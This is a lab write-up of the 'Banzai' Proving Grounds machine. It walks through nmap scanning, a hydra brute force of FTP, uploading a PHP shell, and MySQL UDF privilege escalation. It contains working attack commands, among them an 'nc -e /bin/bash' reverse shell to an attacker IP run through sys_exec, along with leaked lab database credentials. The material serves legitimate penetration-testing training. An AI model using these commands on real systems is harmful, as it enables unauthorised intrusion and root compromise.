---
title: "Proving grounds Practice: Banzai"
layout: post
date: 2024-01-15 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- PG-Practice
- 
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice linux machine writeup"
---

# NMAP

```text
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
25/tcp   open  smtp       Postfix smtpd
5432/tcp open  postgresql PostgreSQL DB 9.6.4 - 9.6.6 or 9.6.13 - 9.6.19
8080/tcp open  http       Apache httpd 2.4.25
8295/tcp open  http       Apache httpd 2.4.25 ((Debian))
```

## 21/tcp   open  ftp        vsftpd 3.0.3

anonymous login prohibited
user:system - failed

Crack the password using hydra.

```sh
naveenj@hackerspace:|10:55|~/proving_grounds/Banzai$ hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.217.56
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-21 10:57:12
[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking ftp://192.168.217.56:21/
[21][ftp] host: 192.168.217.56   login: admin   password: admin
```

## Login to FTP server

- upload php shell and trigger it to get initial foothold.
- Try reverse connection port as 22.

Found Database credentials.php

```text
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'EscalateRaftHubris123');
define('DBNAME', 'main');
```

## Privilege Escalation

Download exploit

- https://www.exploit-db.com/exploits/1518

Connect to mysql db

```sh
ww-data@banzai:/var/www/html$ mysql -uroot -pEscalateRaftHubris123
mysql -uroot -pEscalateRaftHubris123
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 2
Server version: 5.7.30 MySQL Community Server (GPL)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

## Download precompiled lib from metasploit

- https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql

upload through ftp

```sh
mysql> use mysql;	#select db
use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> create table foo(line blob);		#create table
create table trenchesofit(line blob);
Query OK, 0 rows affected (0.00 sec)

mysql> insert into foo values(load_file('/var/www/html/lib_mysqludf_sys_64.so'));	#upload exploit lib
insert into trenchesofit values(load_file('/var/www/html/lib_mysqludf_sys_64.so'));
Query OK, 1 row affected (0.01 sec)

mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so';	#upload exploit to mysql lib
select * from trenchesofit into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so';
Query OK, 1 row affected (0.03 sec)

mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';	#use lib
create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';
Query OK, 0 rows affected (0.00 sec)

mysql> select sys_exec('nc -e /bin/bash 192.168.45.160 22');	#exec command
select sys_exec('nc -e /bin/bash 192.168.45.160 22');
```

![img](/assets/images/CTF/Proving_Grounds/Banzai/root.png)

**Root Obtained**

## Important Takeaway
- The lib file has to be place in /usr/lib/mysql/plugin/lib_mysqludf_sys_64.so folder else the exploit won't work.

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).